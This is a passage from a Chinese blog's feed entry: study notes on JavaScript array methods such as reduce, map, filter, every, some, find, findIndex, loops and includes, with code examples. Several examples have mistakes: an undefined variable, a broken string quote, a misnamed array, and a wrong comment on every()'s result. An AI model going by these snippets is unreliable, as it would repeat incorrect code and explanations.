或者计算结束后的返回值。</p></td></tr><tr><td><p><strong>currentValue</strong></p></td><td><p>必需。当前元素</p></td></tr><tr><td><p>currentIndex</p></td><td><p>可选。当前元素的索引</p></td></tr><tr><td><p>arr</p></td><td><p>可选。当前元素所属的数组对象。</p></td></tr></tbody></table></td></tr><tr><td><p><em>initialValue</em></p></td><td><p>可选。传递给函数的初始值</p></td></tr></tbody></table><ul><li>  直接对数组值进行累加</li></ul><p>var nums = [1, 2, 3, 4, 5]<br>var result = nums.<strong>reduce</strong>((a, b) =&gt; a + b, 10) // 10 为初始值<br>console.log(‘result:’, result) // 累加结果：25<br>var sum = nums.reduce((pre, cur) =&gt; {<br>      return pre + cur<br>}, 10) // 10 为pre初始值<br>console.log(sum) // 25</p><ul><li>  对数组值先进行四舍五入，然后再进行累加</li></ul><p>var nums = [1.1, 2.2, 3.3, 4.4, 5.5]<br>var result = nums.<strong>reduce</strong>((a, b) =&gt; a + Math.round(b), <strong>0.5</strong>)<br>console.log(‘result:’, result) // 此时 0.5 作为初始累加结果，数组所有项四舍五入累加，最终结果为：16.5</p><p>2.reduceRight()：从数组的最后一项开始，向前遍历到第一项</p><p><strong>⑨数组迭代方法</strong></p><p>传入这些方法中的函数<font color="#FF8C00">均会接收 3 个参数</font>：<br>Ⅰ.item（必须）：数组项的值<br>Ⅱ.index（可选）：该项在数组中的位置<br>Ⅲ.array（可选）：数组对象本身</p><p>var typeKey = [0, 1, 2, 3, ‘’]</p><ol><li>filter()：<strong>返回该<font color="#FF00FF">函数会返回 true 的项组成的数组</font>（常用于过滤空数组项</strong>）</li></ol><p><strong>typeKey= typeKey.filter</strong>(item =&gt; {<br>                return item !== ‘’<br>        })<br>console.log(‘typeKey:’, typeKey) // [0, 1, 2, 3]</p><ol start="2"><li>forEach()：<strong>对数组每一项执行一遍回调函数（<font color="#FF8C00">没有返回值</font>）</strong></li></ol><p><strong>typeKey**</strong>.**<strong>forEach</strong>(item =&gt; {<br>        if (item) {<br>                console.log(item)<br>        }<br>})</p><p>3.map()：<strong>返回每次<font color="#FF00FF">函数调用的结果组成的数组</font>（常用于处理数组项</strong>）</p><p>map() 方法：</p><ol><li>返回一个<font color="#FF00FF">新数组</font>，数组中的元素为原始数组元素调用函数处理后的值。</li><li>按照原始数组元素顺序依次处理元素。</li></ol><p>注意： map() <font color="#FF00FF">不会对空数组进行检测</font>。<br>注意： map() <font color="#FF00FF">不会改变原始数组</font>。</p><p><strong>var result = typeKey**</strong>.**<strong>map</strong>(item =&gt; {<br>        if (item) {<br>                return 1<br>        } else {<br>                return 0<br>        }<br>})<br>console.log(‘result:’, result) // [0, 1, 1, 1, 0]</p><p>按条件删除数组某些的对象中的某些字段</p><p><img src="https://img-blog.csdnimg.cn/0ab7bfc1c5234f078655de1bb376c821.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAdGhlTXVzZUNhdGNoZXI=,size_15,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>this.types.map(item =&gt; {</strong><br> <strong>if (item.value === ‘2’) {</strong><br> <strong>return delete item.value</strong><br> <strong>} else {</strong><br> <strong>return item</strong><br> <strong>}</strong><br><strong>})</strong></p><p>console.log(‘types:’, this.types)</p><p><img src="https://img-blog.csdnimg.cn/a679c094eec34144b4dc3b14331227ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAdGhlTXVzZUNhdGNoZXI=,size_15,color_FFFFFF,t_70,g_se,x_16"></p><p>4*. every()*：**用于检测数组所有元素是否都符合指定条件（通过函数提供）。</p><p>every() 方法使用指定函数检测数组中的所有元素：</p><ul><li>  如果数组中检测到有<font color="#FF00FF">一个元素不满足，则整个表达式返回 false ，且剩余的元素不会再进行检测</font>。</li><li>  如果所有元素都满足条件，则返回 true。</li></ul><p>注意： <font color="#FF00FF">every() 不会对空数组进行检测</font>。<br>注意： <font color="#FF00FF">every() 不会改变原始数组</font>。</p><p>语法：array.every(function(currentValue,index,arr), thisValue)</p><p><strong>var result = typeKey.every</strong>((item, index, array) =&gt; {<br>                return item&gt;2<br>        }) // 数组所有项均大于 2，即都返回 true，则最后返回 true</p><p><strong>5**</strong>.some()**<strong>：</strong>用于检测数组中的元素是否满足指定条件（函数提供）</p><p>some() 方法会依次执行数组的每个元素：</p><ul><li>  如果<font color="#FF8C00">有一个元素满足条件，则表达式返回 true , 剩余的元素不会再执行检测。</font></li><li>  如果没有满足条件的元素，则返回 false。</li></ul><p>注意： <font color="#FF00FF">some() 不会对空数组进行检测</font>。<br>注意：<font color="#FF00FF"> some() 不会改变原始数组</font>。</p><p>语法：array.some(function(currentValue,index,arr),thisValue)</p><p><strong>var result = typeKey.some</strong>((item, index, array) =&gt; {<br>                return item&gt;2<br>        }) // 数组存在大于 2 的项，则最后返回 true</p><p><strong>var result = typeKey.some(item =&gt; item &gt; 2)</strong><br>console.log(‘result:’, result) // true</p><p><strong>6**</strong>.**<strong>find()：</strong><font color="#FF00FF">返回通过测试（函数内判断）的数组的第一个元素</font></p><p>find() 方法为数组中的每个元素都调用一次函数执行：</p><ul><li>  当数组中的元素在测试条件时返回 true 时,<font color="#FF00FF"> find() 返回符合条件的元素，之后的值不会再调用执行函数</font>。</li><li>  如果<font color="#FF00FF">没有符合条件的元素返回 undefined</font></li></ul><p>注意: <font color="#FF00FF">find() 对于空数组，函数是不会执行的。</font><br>注意: <font color="#FF00FF">find() 并没有改变数组的原始值</font>。</p><p>语法：array.find(function(currentValue, index, arr),thisValue)</p><p>var types = [<br>        {<br>                name: ‘单选题’,<br>                value: 1<br>        },<br>        {<br>                name: ‘多选题’,<br>                value: 2<br>        },<br>        {<br>                name: ‘判断题’,<br>                value: 3<br>        }<br>]</p><p>var result = <strong>types.find(item =&gt; item.value === 3)</strong><br>console.log(‘result:’, result)</p><p><img src="https://img-blog.csdnimg.cn/5010af92e37f4ccc905b4599b94abd30.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAdGhlTXVzZUNhdGNoZXI=,size_14,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>7**</strong>.findIndex()**：返回传入一个测试条件（函数）符合条件的数组第一个元素的<font color="#FF00FF">位置索引</font>。</p><p>findIndex() 方法为数组中的每个元素都调用一次函数执行：</p><ul><li>  当数组中的元素在测试条件返回 true 时, findIndex() 返回符合条件的元素的索引位置，<font color="#FF00FF">之后的值不会再调用执行函数</font>。</li><li>  如果没有符合条件的元素返回 -1</li></ul><p><font color="#FF00FF">注意: findIndex() 对于空数组，函数是不会执行的。<br>注意: findIndex() 并没有改变数组的原始值。</font></p><p>语法：array.findIndex(function(currentValue, index, arr), thisValue)</p><p>var types = [<br>        {<br>                name: ‘单选题’,<br>                value: 1<br>        },<br>        {<br>                name: ‘多选题’,<br>                value: 2<br>        },<br>        {<br>                name: ‘判断题’,<br>                value: 3<br>        }<br>]</p><p>var result = <strong>types.find**<strong>Index</strong></strong>(item =&gt; item.value === 3)**<br>console.log(‘result:’, result) // 索引：2</p><p><strong>8.for…<strong><strong>，</strong></strong>for…of 和 for…in</strong></p><p>var nums = [1, 2, 3, 4]<br>for (let i = 0; i &lt; str.length; i++) {<br>      console.log(str[i]) // 字符串每项的值<br>}</p><p>for (const n of nums) {<br>      console.log(‘item:’, n) // 数组<font color="#FF8C00">每项的值</font><br>}</p><p>for (const i in nums) {<br>      console.log(‘index:’, ‘i) // 数组每项的<font color="#FF00FF">索引下标（string 类型）</font><br>}</p><p>**⑩includes()**<strong>：</strong>用来判断一个数组是否包含一个指定的值（或者<font color="#FF8C00">判断字符串是否包含指定的子字符串</font>），如果是<font color="#FF00FF">返回 true，否则 false</font></p><p>var nums = [1, 2, 3]<br>nums.includes(2) // true<br>num.includes(4) // false</p><p>var site = [‘runoob’, ‘google’, ‘taobao’]<br>site.includes(‘runoob’) // true<br>site.includes(‘baidu’) // false</p><p><strong>数组的拷贝</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array.slice(0); //返回数组的拷贝数组，注意是一个新的数组，不是指向</span><br><span class="line">array.concat(); //返回数组的拷贝数组，注意是一个新的数组，不是指向</span><br></pre></td></tr></table></figure><p><strong>数组元素的字符串化</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array.join(separator); //返回字符串，这个字符串将数组的每一个元素值连接在一起，中间用 separator 隔开。</span><br><span class="line"> </span><br><span class="line">toLocaleString 、toString 、valueOf：可以看作是join的特殊用法，不常用</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
</feed>
